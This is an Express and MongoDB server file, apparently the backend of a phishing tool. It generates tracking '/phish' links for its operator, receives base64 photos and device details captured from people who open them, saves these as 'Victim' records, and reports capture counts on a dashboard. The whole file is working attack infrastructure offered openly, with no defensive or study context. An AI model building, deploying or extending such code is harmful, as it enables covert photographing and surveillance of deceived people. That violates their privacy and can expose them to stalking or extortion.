// server.js
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve static HTML files

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => console.log("MongoDB Connected"))
  .catch(err => console.log(err));

// Schema
const VictimSchema = new mongoose.Schema({
    userId: String,
    email: String, // Optional (if we capture it later)
    imageBase64: String,
    capturedAt: { type: Date, default: Date.now },
    deviceInfo: String
});

const Victim = mongoose.model('Victim', VictimSchema);

// --- API ROUTES ---

// 1. Generate a unique phishing link ID (Simulating Auth/Signup)
app.post('/api/generate-link', async (req, res) => {
    const { email } = req.body;
    const uid = uuidv4().substring(0, 8); // Short ID for cleaner URL
    
    // In a real app, you'd save this user to DB. 
    // For this demo, the link just contains the ID in the query param.
    res.json({ success: true, link: `${process.env.BASE_URL || 'http://localhost:3000'}/phish?uid=${uid}`, userId: uid });
});

// 2. Receive the captured photo
app.post('/api/capture', async (req, res) => {
    const { userId, imageBase64, deviceInfo } = req.body;

    try {
        const newVictim = new Victim({
            userId: userId,
            imageBase64: imageBase64,
            deviceInfo: deviceInfo || "Unknown Device"
        });
        
        await newVictim.save();
        res.status(201).json({ success: true, message: "Photo Captured Successfully" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: "Database Error" });
    }
});

// 3. Get Stats for Dashboard
app.get('/api/stats/:userId', async (req, res) => {
    const count = await Victim.find({ userId: req.params.userId }).countDocuments();
    // In a real app, calculate dates, etc.
    res.json({ totalCaptures: count });
});

// Start Server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));